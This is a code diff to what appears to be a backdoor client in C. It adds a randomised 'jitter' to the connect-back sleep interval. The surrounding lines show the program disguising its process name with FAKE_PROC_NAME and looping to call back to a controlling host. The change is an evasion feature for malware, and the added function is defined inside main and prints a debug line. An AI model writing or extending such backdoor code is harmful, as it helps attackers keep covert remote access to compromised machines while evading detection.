@@ -69,6 +69,21 @@ int main( int argc,char **argv )
     struct hostent *client_host;
 
 #endif
+
+
+#ifdef CONNECT_BACK_HOST
+    int jitter() 
+    {
+        srand(time(NULL));
+        // Generate a random number between 1 and 15
+        int randomNumber = rand() % 15 + 1;
+        printf("randomNumber: %d\n", randomNumber);
+        int jitter = CONNECT_BACK_DELAY * randomNumber / 100;
+        int sleep_jitter = CONNECT_BACK_DELAY + jitter;
+        return sleep_jitter;
+    }
+
+#endif
     /* overwrite cmdline */
     memset((void *)argv[0], '\0', strlen(argv[0]));
     strcpy(argv[0], FAKE_PROC_NAME);
@@ -159,7 +174,7 @@ int main( int argc,char **argv )
 
     while( 1 )
     {
-        sleep( CONNECT_BACK_DELAY );
+        sleep( jitter() );
 
         /* create a socket */
 
